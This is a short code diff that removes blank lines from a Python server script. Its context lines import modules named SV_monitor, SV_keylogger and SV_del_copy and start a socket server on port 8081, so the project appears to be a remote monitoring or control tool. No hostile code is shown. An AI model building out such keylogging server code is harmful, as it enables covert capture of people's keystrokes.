@@ -8,8 +8,6 @@ import Server.SV_monitor
 import Server.SV_keylogger
 import Server.SV_del_copy
 
-
-
 def main():
     server_ip = socket.gethostbyname(socket.gethostname())
     port = 8081
